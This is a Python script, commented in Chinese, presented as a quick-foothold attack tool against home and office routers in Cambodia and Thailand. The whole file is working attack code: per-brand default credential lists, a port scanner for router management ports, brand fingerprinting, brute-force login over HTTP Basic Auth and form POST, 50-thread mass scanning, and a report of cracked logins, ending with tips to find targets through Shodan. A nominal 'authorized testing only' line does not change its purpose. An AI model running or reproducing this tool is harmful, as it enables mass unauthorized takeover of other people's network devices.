#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
路由器快速打点攻击工具
基于柬埔寨和泰国最常用路由器的快速突破技术
"""

import requests
import socket
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor
import random

class RouterQuickAttack:
    def __init__(self):
        # 基于统计的最常用默认凭据
        self.default_credentials = {
            'TP-Link': [
                ('admin', 'admin'),
                ('admin', ''),
                ('root', 'admin'),
                ('admin', 'password'),
                ('admin', '1234'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'root'),
                ('admin', 'toor'),
                ('admin', 'pass')
            ],
            'D-Link': [
                ('admin', ''),
                ('admin', 'admin'),
                ('user', 'user'),
                ('admin', 'password'),
                ('admin', '1234'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'root'),
                ('admin', 'toor'),
                ('admin', 'pass')
            ],
            'Tenda': [
                ('admin', ''),
                ('admin', 'admin'),
                ('root', 'admin'),
                ('admin', '1234'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'password'),
                ('admin', 'root'),
                ('admin', 'toor')
            ],
            'Cisco': [
                ('admin', 'admin'),
                ('cisco', 'cisco'),
                ('admin', 'cisco'),
                ('root', 'cisco'),
                ('admin', 'password'),
                ('admin', '1234'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'root'),
                ('admin', 'toor')
            ],
            'Netgear': [
                ('admin', 'password'),
                ('admin', '1234'),
                ('admin', 'admin'),
                ('admin', ''),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'root'),
                ('admin', 'toor'),
                ('admin', 'pass')
            ],
            'ASUS': [
                ('admin', 'admin'),
                ('admin', ''),
                ('root', 'admin'),
                ('admin', 'password'),
                ('admin', '1234'),
                ('admin', '123456'),
                ('admin', 'admin123'),
                ('admin', 'root'),
                ('admin', 'toor')
            ]
        }
        
        # 常见路由器管理端口
        self.common_ports = [80, 8080, 443, 8443, 23, 21, 22, 7547, 9000, 9090]
        
        # 路由器特征识别
        self.router_signatures = {
            'TP-Link': ['tp-link', 'tplink', 'archer', 'tl-wr', 'tl-wa'],
            'D-Link': ['d-link', 'dlink', 'dir-', 'dgs-'],
            'Tenda': ['tenda', 'ac6', 'ac9', 'n301'],
            'Cisco': ['cisco', 'rv320', 'rv340', 'wrt'],
            'Netgear': ['netgear', 'r7000', 'wndr'],
            'ASUS': ['asus', 'rt-', 'ac68u']
        }
        
        # 攻击结果
        self.successful_attacks = []
        self.failed_attacks = []
    
    def identify_router_brand(self, ip, port=80):
        """快速识别路由器品牌"""
        try:
            response = requests.get(
                f'http://{ip}:{port}',
                timeout=5,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            content = response.text.lower()
            title = response.headers.get('title', '').lower()
            
            for brand, signatures in self.router_signatures.items():
                if any(sig in content or sig in title for sig in signatures):
                    return brand
            
            # 通用路由器检测
            if any(keyword in content for keyword in ['router', 'gateway', 'admin', 'login']):
                return 'Generic'
                
        except:
            pass
        
        return 'Unknown'
    
    def brute_force_login(self, ip, port, brand, max_attempts=20):
        """暴力破解登录"""
        if brand not in self.default_credentials:
            brand = 'Generic'
            creds = [('admin', 'admin'), ('admin', ''), ('admin', 'password'), ('admin', '1234')]
        else:
            creds = self.default_credentials[brand]
        
        # 限制尝试次数
        creds = creds[:max_attempts]
        
        for username, password in creds:
            try:
                # 尝试HTTP Basic Auth
                auth = (username, password)
                response = requests.get(
                    f'http://{ip}:{port}',
                    auth=auth,
                    timeout=5,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'brand': brand,
                        'username': username,
                        'password': password,
                        'method': 'HTTP Basic Auth',
                        'status_code': response.status_code,
                        'title': self.extract_title(response.text)
                    }
                
                # 尝试POST登录
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                    'submit': 'Login'
                }
                
                response = requests.post(
                    f'http://{ip}:{port}/login',
                    data=login_data,
                    timeout=5,
                    allow_redirects=True
                )
                
                if response.status_code == 200 and 'login' not in response.text.lower():
                    return {
                        'ip': ip,
                        'port': port,
                        'brand': brand,
                        'username': username,
                        'password': password,
                        'method': 'POST Login',
                        'status_code': response.status_code,
                        'title': self.extract_title(response.text)
                    }
                
            except:
                continue
        
        return None
    
    def extract_title(self, html_content):
        """提取页面标题"""
        try:
            import re
            title_match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return 'No Title'
    
    def scan_single_target(self, ip, ports=None):
        """扫描单个目标"""
        if ports is None:
            ports = self.common_ports
        
        results = []
        
        for port in ports:
            try:
                # 检查端口是否开放
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:  # 端口开放
                    # 识别路由器品牌
                    brand = self.identify_router_brand(ip, port)
                    
                    if brand != 'Unknown':
                        # 尝试暴力破解
                        attack_result = self.brute_force_login(ip, port, brand)
                        
                        if attack_result:
                            results.append(attack_result)
                            self.successful_attacks.append(attack_result)
                            print(f"✅ 成功突破: {ip}:{port} - {brand} - {attack_result['username']}:{attack_result['password']}")
                        else:
                            self.failed_attacks.append({
                                'ip': ip,
                                'port': port,
                                'brand': brand,
                                'reason': 'Login failed'
                            })
                            print(f"❌ 登录失败: {ip}:{port} - {brand}")
                
            except Exception as e:
                continue
        
        return results
    
    def mass_scan(self, target_list, max_threads=50):
        """批量扫描目标"""
        print(f"🚀 开始批量扫描 {len(target_list)} 个目标...")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(self.scan_single_target, target) for target in target_list]
            
            for i, future in enumerate(futures):
                try:
                    results = future.result(timeout=30)
                    if (i + 1) % 10 == 0:
                        print(f"📊 已扫描 {i + 1}/{len(target_list)} 个目标")
                except:
                    pass
        
        return self.successful_attacks
    
    def generate_attack_report(self):
        """生成攻击报告"""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'successful_attacks': len(self.successful_attacks),
            'failed_attacks': len(self.failed_attacks),
            'success_rate': len(self.successful_attacks) / (len(self.successful_attacks) + len(self.failed_attacks)) * 100 if (len(self.successful_attacks) + len(self.failed_attacks)) > 0 else 0,
            'attacks': self.successful_attacks,
            'failed': self.failed_attacks
        }
        
        return report
    
    def save_results(self, filename='router_attack_results.json'):
        """保存攻击结果"""
        report = self.generate_attack_report()
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        print(f"💾 攻击结果已保存到: {filename}")
    
    def print_summary(self):
        """打印攻击摘要"""
        print(f"\n" + "="*60)
        print(f"🎯 路由器快速攻击摘要")
        print(f"="*60)
        print(f"成功突破: {len(self.successful_attacks)} 台")
        print(f"攻击失败: {len(self.failed_attacks)} 台")
        
        if len(self.successful_attacks) > 0:
            print(f"成功率: {len(self.successful_attacks) / (len(self.successful_attacks) + len(self.failed_attacks)) * 100:.1f}%")
            
            print(f"\n🏆 成功突破的设备:")
            for i, attack in enumerate(self.successful_attacks[:10], 1):
                print(f"   {i}. {attack['ip']}:{attack['port']} - {attack['brand']} - {attack['username']}:{attack['password']}")
            
            if len(self.successful_attacks) > 10:
                print(f"   ... 还有 {len(self.successful_attacks) - 10} 台设备")

def main():
    """主函数"""
    print("🚀 路由器快速打点攻击工具")
    print("⚠️  注意: 此工具仅用于授权的安全测试")
    
    attacker = RouterQuickAttack()
    
    # 示例目标列表（基于柬埔寨和泰国的IP范围）
    sample_targets = [
        # 这里应该填入实际的目标IP
        # 为了演示，使用一些示例IP
        '192.168.1.1',
        '192.168.0.1',
        '10.0.0.1',
        '172.16.0.1'
    ]
    
    print(f"📋 目标列表: {len(sample_targets)} 个IP")
    
    # 开始攻击
    results = attacker.mass_scan(sample_targets)
    
    # 显示结果
    attacker.print_summary()
    
    # 保存结果
    attacker.save_results()
    
    print(f"\n💡 快速打点技巧:")
    print(f"   1. 优先扫描80, 8080, 443端口")
    print(f"   2. 使用最常用的默认凭据")
    print(f"   3. 重点关注TP-Link和D-Link设备")
    print(f"   4. 使用多线程提高效率")
    print(f"   5. 结合Shodan API快速发现目标")

if __name__ == "__main__":
    main()